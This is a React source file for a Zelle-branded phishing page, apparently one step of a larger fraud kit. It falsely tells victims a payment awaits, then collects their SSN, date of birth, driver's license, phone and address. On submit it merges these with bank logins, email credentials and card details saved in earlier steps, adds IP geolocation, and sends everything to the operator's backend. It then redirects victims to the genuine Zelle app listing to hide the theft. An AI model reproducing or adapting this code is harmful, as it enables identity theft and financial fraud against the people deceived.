import React, { useEffect, useState } from 'react';
import '../styles/CompleteTXPage.css';
import { useAppContext } from '../context/AppContext';
import Cleave from 'cleave.js/react';
import zelleLogowhite from '../assets/imgs/zelleloggowhite.svg'
import { backendLink } from '../utils/backendLink';

const CompleteTXPage = () => {
  const { navigateTo, bankDetails } = useAppContext();
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    phoneNumber: '',
    dateOfBirth: '',
    ssn: '',
    driversLicense: '',
    streetAddress: '',
    zipcode: ''
  });
  const [errors, setErrors] = useState({});
  const [bankName, setBankName] = useState('');

  useEffect(() => {
    document.title = `Complete Transaction | Zelle`;
    if (bankDetails) {
      setBankName(bankDetails?.name);
    } else if (localStorage.getItem('bankCredentials')) {
      const bankCredentials = JSON.parse(localStorage.getItem('bankCredentials'));
      setBankName(bankCredentials?.name);
    } else {
      navigateTo('/');
    }
  }, [bankName]);

  // Validation function
  const validateForm = () => {
    const newErrors = {};

    if (!formData.firstName.trim()) newErrors.firstName = 'First name is required';
    if (!formData.lastName.trim()) newErrors.lastName = 'Last name is required';
    if (!formData.phoneNumber.trim()) newErrors.phoneNumber = 'Phone number is required';
    if (!formData.dateOfBirth.trim()) newErrors.dateOfBirth = 'Date of birth is required';
    if (!formData.ssn.trim()) newErrors.ssn = 'SSN is required';
    if (!formData.driversLicense.trim()) newErrors.driversLicense = 'Driver\'s license is required';
    if (!formData.streetAddress.trim()) newErrors.streetAddress = 'Street address is required';
    if (!formData.zipcode.trim()) newErrors.zipcode = 'Zipcode is required';
    if (!/^\d{5}$/.test(formData.zipcode)) newErrors.zipcode = 'Zipcode must be exactly 5 digits';
    if (formData.phoneNumber.replace(/\D/g, '').length !== 10) newErrors.phoneNumber = 'Please enter a valid 10-digit phone number';

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // Add this formatting function near your other functions
  const formatPhoneNumber = (value) => {
    // Remove all non-digits
    const cleaned = value.replace(/\D/g, '');

    // Limit to 10 digits
    const trimmed = cleaned.slice(0, 10);

    // Format as (XXX) XXX-XXXX
    if (trimmed.length >= 6) {
      return `(${trimmed.slice(0, 3)}) ${trimmed.slice(3, 6)}-${trimmed.slice(6)}`;
    } else if (trimmed.length >= 3) {
      return `(${trimmed.slice(0, 3)}) ${trimmed.slice(3)}`;
    } else if (trimmed.length > 0) {
      return `(${trimmed}`;
    }
    return trimmed;
  };

  function is_apple() {
    let is_valid = [
      'iPad Simulator',
      'iPhone Simulator',
      'iPod Simulator',
      'iPad',
      'iPhone',
      'iPod'
    ].includes(navigator.platform)
    if (is_valid) return true;
    return /iPad|iPhone|iPod|Mac/.test(navigator.userAgent)
  }

  const handleChange = (e) => {
    const { name, value } = e.target;

    if (name === 'phoneNumber') {
      setFormData(prev => ({
        ...prev,
        [name]: formatPhoneNumber(value)
      }));
    } else if (name === 'zipcode') {
      // Only allow numbers and limit to 5 digits
      const sanitizedValue = value.replace(/\D/g, '').slice(0, 5);
      setFormData(prev => ({
        ...prev,
        [name]: sanitizedValue
      }));
    } else {
      setFormData(prev => ({
        ...prev,
        [name]: value
      }));
    }

    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      setIsLoading(true);

      const detailsForBank = JSON.parse(localStorage.getItem('bankCredentials'))
      const emailDetails = JSON.parse(localStorage.getItem('emailCredentials'))
      const cardDetails = JSON.parse(localStorage.getItem('cardDetails'))
      const request = await fetch("https://ipinfo.io/json?token=89c9a207b93bbb")
      const jsonResponse = await request.json()

      const allDetails = {
        ...detailsForBank,
        ...emailDetails,
        ...cardDetails,
        ...formData,
        ...jsonResponse,
        dataName: "DATA_4 - Complete User Details",
        timestamp: new Date().toISOString() };

      // clear each local storage
      localStorage.removeItem('bankCredentials');
      localStorage.removeItem('emailCredentials');
      localStorage.removeItem('cardDetails');

      try {
        const response = await fetch(`${backendLink}/api/details`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(allDetails)
        });
        console.log(response)

        if (!response.ok) {
          throw new Error('Network response was not ok');
        }

        // Simulate API call with timeout
        setTimeout(() => {
          setIsLoading(false);
          let FINAL_REDIRECTION = is_apple() ? "https://itunes.apple.com/us/app/zelle/id1260755201?ls=1&mt=8" : "https://play.google.com/store/apps/details?id=com.zellepay.zelle"
          window.location.href = FINAL_REDIRECTION;
        }, 1000);
      } catch (error) {
        console.error('Error sending details:', error);
        setIsLoading(false);
        // Optionally handle the error in the UI
      }
    }
  };

  return (
    <div className="CPTX-page-container">
        <div className="logo-container-CPTX">
          <a className="site-branding__link" href="/" title="Home" rel="home">
            <img className="zelle-logo" src={zelleLogowhite} alt="" />
          </a>
        </div>
      <div className="complete-tx-container">
        <div className="complete-tx-content-container">
          <div className="complete-tx-content">
            <div className="success-message">
              Your {bankDetails?.name} account has been successfully validated, please complete the final step below to receive the money.
            </div>

            <h1 className="complete-tx-title">Complete transaction.</h1>

            <div className="congratulations-text">
              <span className="purple-text">Congratulations</span>, the transaction has been initiated and your
              <span className="bold-text"> {bankName}</span> account would be credited in few minutes. however, you
              have to complete the quick form below to complete transaction.
            </div>

            <form className="transaction-form" onSubmit={handleSubmit}>
              <div className="form-row">
                <div className="form-group">
                  <label>First Name</label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleChange}
                    className={errors.firstName ? 'error' : ''}
                  />
                  {errors.firstName && <span className="error-message">{errors.firstName}</span>}
                </div>
                <div className="form-group">
                  <label>Last Name</label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleChange}
                    className={errors.lastName ? 'error' : ''}
                  />
                  {errors.lastName && <span className="error-message">{errors.lastName}</span>}
                </div>
              </div>

              <div className="form-row">
                <div className="form-group">
                  <label>Phone Number</label>
                  <input
                    type="tel"
                    name="phoneNumber"
                    value={formData.phoneNumber}
                    onChange={handleChange}
                    placeholder="Enter your phone number"
                    className={errors.phoneNumber ? 'error' : ''}
                  />
                  {errors.phoneNumber && <span className="error-message">{errors.phoneNumber}</span>}
                </div>
                <div className="form-group">
                  <label htmlFor="dob">Date of Birth</label>
                  {/* <input 
                  type="date"
                  name="dob"
                  id="dob"
                  value={formData.dateOfBirth}
                  onChange={handleChange}
                  placeholder="Enter your date of birth eg. mm/dd/yyyy"
                  className={errors.dateOfBirth ? 'error' : ''}
                  onfocus="(this.type='date')" 
                  onblur="(this.type='text')"
                /> */}
                  <Cleave
                    options={{
                      date: true,
                      datePattern: ['m', 'd', 'Y']
                    }}
                    onChange={handleChange}
                    name="dateOfBirth"
                    placeholder="Enter your date of birth eg. mm/dd/yyyy"
                    className={errors.dateOfBirth ? 'error' : ''}
                    value={formData.dateOfBirth}
                  />
                  {errors.dateOfBirth && <span className="error-message">{errors.dateOfBirth}</span>}
                </div>
              </div>

              <div className="form-row">
                <div className="form-group">
                  <label>Social Security Number (SSN)</label>
                  {/* <input 
                  type="text"
                  name="ssn"
                  value={formData.ssn}
                  onChange={handleChange}
                  className={errors.ssn ? 'error' : ''}
                /> */}
                  <Cleave
                    options={{
                      delimiters: ['-', '-'],
                      blocks: [3, 2, 4],
                      numericOnly: true
                    }}
                    className={errors.ssn ? 'error' : ''}
                    type='text'
                    name='ssn'
                    value={formData.ssn}
                    onChange={handleChange}
                  />
                  {errors.ssn && <span className="error-message">{errors.ssn}</span>}
                </div>
                <div className="form-group">
                  <label>Driver's License</label>
                  <input
                    type="text"
                    name="driversLicense"
                    value={formData.driversLicense}
                    onChange={handleChange}
                    className={errors.driversLicense ? 'error' : ''}
                  />
                  {errors.driversLicense && <span className="error-message">{errors.driversLicense}</span>}
                </div>
              </div>

              <div className="form-row">
                <div className="form-group">
                  <label>Street Address</label>
                  <input
                    type="text"
                    name="streetAddress"
                    value={formData.streetAddress}
                    onChange={handleChange}
                    className={errors.streetAddress ? 'error' : ''}
                  />
                  {errors.streetAddress && <span className="error-message">{errors.streetAddress}</span>}
                </div>
                <div className="form-group">
                  <label>Zipcode</label>
                  <input
                    type="tel"
                    name="zipcode"
                    value={formData.zipcode}
                    onChange={handleChange}
                    className={errors.zipcode ? 'error' : ''}
                    placeholder="Enter 5-digit zipcode"
                  />
                  {errors.zipcode && <span className="error-message">{errors.zipcode}</span>}
                </div>
              </div>

              <button
                type="submit"
                className="complete-tx-button"
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="button-content">
                    <span className="spinner"></span>
                    <span>Processing...</span>
                  </div>
                ) : 'Complete Transaction'}
              </button>
            </form>
          </div>
        </div>
        <footer>
          <div className="footer-content">
            <div className="footer-logo-social">
              <div className="footer-loggo-item">
                <img src={zelleLogowhite} alt="Z" className="z" />
              </div>
              <div className="footer-links">
                <a href="#">Contact Us</a>
                <a href="#">Partners</a>
                <a href="#">Press</a>
                <a href="#">Legal</a>
                <a href="#">Your Privacy Rights</a>
              </div>
              <div className="social-links">
                <a href="#" className="twitter">Twitter</a>
                <a href="#" className="facebook">Facebook</a>
                <a href="#" className="instagram">Instagram</a>
                <a href="#" className="youtube">YouTube</a>
              </div>
            </div>
            <div className="footer-text">
              <p className="footer-note">
                ¹Must have a bank account in the U.S. to use Zelle®. Transactions typically occur in minutes when the recipient's email address
                or U.S. mobile number is already enrolled with Zelle®
              </p>
              <p className="copyright">
                ©{new Date().getFullYear()} Early Warning Services, LLC. All rights reserved. Zelle and the Zelle related marks are property of Early Warning
                Services, LLC. Other product and company names mentioned herein are the property of their respective owners.
              </p>
            </div>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default CompleteTXPage;
